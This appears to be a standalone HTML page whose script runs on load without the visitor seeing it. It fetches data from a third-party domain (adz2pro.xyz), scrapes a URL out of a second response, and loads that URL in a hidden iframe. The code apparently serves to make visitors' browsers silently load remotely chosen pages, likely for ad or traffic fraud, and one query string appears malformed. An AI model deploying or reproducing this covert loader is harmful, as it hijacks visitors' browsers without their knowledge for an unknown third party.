<!DOCTYPE html>
<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
</head>
<body>
	<div style="display:none">
        <iframe id="declinedframe" src="" height="600" width="600" ></iframe>
    </div>
    
<script>
    
// With the get JSON (frequently used) method
$.get('https://adz2pro.xyz/cors1', function( data ) {
    //console.log(data);
    //alert(data);
	var arr1 = data.split("page_data=", 2);
	var page_data = arr1[1];
	var arr2 = page_data.split('"', 3);
	page_data = arr2[0];

	var time = arr2[2];
	var arr3 = time.split("time=", 2);
	time = arr3[1];
	
        var url4 = 'https://adz2pro.xyz/cors2?page_data' + page_data + '&time=' + time;

	$.get(url4, function( data1 ) {
		  var t1 = data1.split("open('", 2);
		  var t2 = t1[1];
		  var t3 = t2.split("');", 1);
		  var t4 = t3[0];
		 $('#declinedframe').attr('src', t4);
		
	});
});

</script>
</body>
</html>
